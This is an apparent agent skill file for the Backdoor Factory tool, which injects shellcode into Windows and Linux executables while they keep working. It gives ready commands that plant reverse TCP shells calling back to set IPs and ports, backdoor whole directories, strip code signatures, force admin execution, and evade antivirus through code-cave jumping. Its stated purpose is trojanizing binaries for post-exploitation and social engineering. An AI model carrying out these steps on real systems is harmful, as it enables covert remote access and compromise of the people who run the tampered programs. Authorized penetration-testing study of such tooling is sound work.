---
name: backdoor-factory
description: Inject shellcode into win32/64 PE and 32/64-bit ELF binaries while maintaining normal file execution. Use during post-exploitation or social engineering to create trojanized executables, bypass antivirus via code-cave jumping, or automate the backdooring of entire directories of binaries.
---

# backdoor-factory

## Overview
The Backdoor Factory (BDF) patches executable files (PE and ELF) with user-defined shellcode. It identifies "code caves" (unused spaces within the binary) to hide payloads, ensuring the original program functionality remains intact. Category: Post-Exploitation / Social Engineering.

## Installation (if not already installed)
Assume the tool is installed. If missing:

```bash
sudo apt install backdoor-factory
```

## Common Workflows

### List available payloads for a binary
```bash
backdoor-factory -f /usr/share/windows-binaries/plink.exe -s show
```

### Inject a reverse TCP shell into a PE file
```bash
backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline
```

### Backdoor all binaries in a directory using a new section
```bash
backdoor-factory -d /path/to/binaries/ -H 10.10.10.5 -P 8080 -s reverse_shell_tcp -a
```

### Find code caves of a specific size
```bash
backdoor-factory -f target.exe -c -l 500
```

## Complete Command Reference

```
backdoor-factory [options]
```

### Core Options

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |
| `-f FILE`, `--file=FILE` | File to backdoor |
| `-s SHELL`, `--shell=SHELL` | Payloads available for use. Use `show` to see payloads |
| `-H HOST`, `--hostip=HOST` | IP of the C2 for reverse connections |
| `-P PORT`, `--port=PORT` | Port for reverse shells (connect back) or bind shells (listen) |
| `-o OUTPUT`, `--output-file=OUTPUT` | The backdoor output file name |

### Injection Strategy Options

| Flag | Description |
|------|-------------|
| `-J`, `--cave_jumping` | Use code cave jumping to further hide shellcode in the binary |
| `-a`, `--add_new_section` | Mandate a new section be added to the exe (better success, less AV avoidance) |
| `-U SHELLCODE`, `--user_shellcode=SHELLCODE` | User supplied shellcode (must match target architecture) |
| `-c`, `--cave` | Find and print all code caves of a specific size |
| `-l SHELL_LEN`, `--shell_length=SHELL_LEN` | Used with `-c` to find code caves of different sizes |
| `-n NSECTION`, `--section=NSECTION` | New section name (must be less than seven characters) |
| `-w`, `--change_access` | Change the section housing the codecave to RWE (Enabled by default) |
| `-M`, `--cave-miner` | Future use: help determine smallest shellcode possible in a PE file |
| `-m METHOD`, `--patch-method=METHOD` | Patching methods for PE: `manual`, `automatic`, `replace`, `onionduke` |
| `-b BINARY`, `--user_malware=BINARY` | For `onionduke` method: provide your desired binary |
| `-A`, `--idt_in_cave` | EXPERIMENTAL: Put the new Import Directory Table in a code cave |

### Directory & Injector Mode

| Flag | Description |
|------|-------------|
| `-d DIR`, `--directory=DIR` | Location of files to backdoor in bulk |
| `-i`, `--injector` | Turn BDF into a hunt-and-shellcode-inject mechanism |
| `-u SUFFIX`, `--suffix=SUFFIX` | For injector: places a suffix on the original file for recovery |
| `-D`, `--delete_original` | For injector: deletes the original file (Use with caution) |

### Compatibility & Advanced Options

| Flag | Description |
|------|-------------|
| `-S`, `--support_check` | Determine if the file is supported by BDF prior to patching |
| `-T IMAGE_TYPE`, `--image-type=IMAGE_TYPE` | Binary type: `ALL`, `x86`, or `x64`. Default: `ALL` |
| `-Z`, `--zero_cert` | Overwrite pointer to PE certificate table, effectively removing the signature |
| `-R`, `--runas_admin` | EXPERIMENTAL: Patch manifest to require `highestAvailable` execution level |
| `-L`, `--patch_dll` | Use this setting if you **DON'T** want to patch DLLs (Patches by default) |
| `-F FAT_PRIORITY`, `--fat_priority=FAT_PRIORITY` | For MACH-O: focus on arch (`x64`, `x86`, or `ALL`). Default: `x64` |
| `-B BEACON`, `--beacon=BEACON` | Set beacon time in seconds for supported payloads |
| `-X`, `--xp_mode` | Support legacy XP machines (Default: disabled, binary will crash on XP) |
| `-C`, `--code_sign` | Sign PE binaries. Requires `certs/signingcert.cer` and `certs/signingPrivateKey.pem` |
| `-p`, `--preprocess` | Execute preprocessing scripts in the preprocess directory |
| `-q`, `--no_banner` | Suppress the startup banner |
| `-v`, `--verbose` | Enable debug information output |

## Notes
- **AV Avoidance**: Using `-a` (new section) is often flagged by AV. Using existing code caves (`-c`) or cave jumping (`-J`) is generally stealthier.
- **Testing**: Always test backdoored binaries in a lab environment; patching can occasionally corrupt complex executables.
- **Output**: Backdoored files are typically placed in a `backdoored/` directory unless specified with `-o`.